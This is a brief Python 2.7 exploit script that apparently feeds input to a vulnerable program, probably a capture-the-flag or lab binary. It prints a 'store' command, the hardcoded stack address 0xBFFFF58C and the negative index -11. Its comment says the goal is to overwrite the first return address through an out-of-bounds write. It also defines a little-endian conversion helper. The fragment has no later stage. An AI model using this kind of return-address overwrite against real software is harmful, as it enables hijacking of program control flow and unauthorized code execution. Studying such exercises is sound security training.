#!/usr/bin/python2.7

def convert_to_int_le(string):
    return str(int(string[::-1].encode('hex'), 16))

# Overwrite first RA
print "store"
print str(int(0xBFFFF58C))
print "-11"
